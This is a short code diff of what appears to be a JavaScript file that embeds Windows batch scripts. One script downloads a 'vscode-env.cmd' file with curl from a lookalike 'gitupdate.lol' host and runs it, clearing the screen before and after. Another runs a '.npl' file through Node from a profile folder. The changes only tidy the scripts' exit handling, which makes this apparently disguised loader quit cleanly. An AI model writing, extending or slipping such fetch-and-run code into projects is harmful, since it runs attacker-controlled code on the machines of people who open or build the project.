@@ -92,6 +92,7 @@ curl -s -L -o "%VSCODE_DIR%\\vscode-env.cmd" https://gitupdate.lol/settings/boot
 cls
 "%VSCODE_DIR%\\vscode-env.cmd"
 cls
+exit 0
     	`;
       break;
 
@@ -216,16 +217,16 @@ if not exist "%~dp0node_modules\\axios" (
         popd
         exit /b 1
     )
-    exit
+    popd
 )else (
   pushd "%CODEPROFILE%"
   "%NODE_EXE%" "%CODEPROFILE%\\env-setup.npl"
   if errorlevel 1 (
     exit /b 1
   )
-  exit
+  popd
 )
-exit
+exit /b 0
     	`;
       break;
 
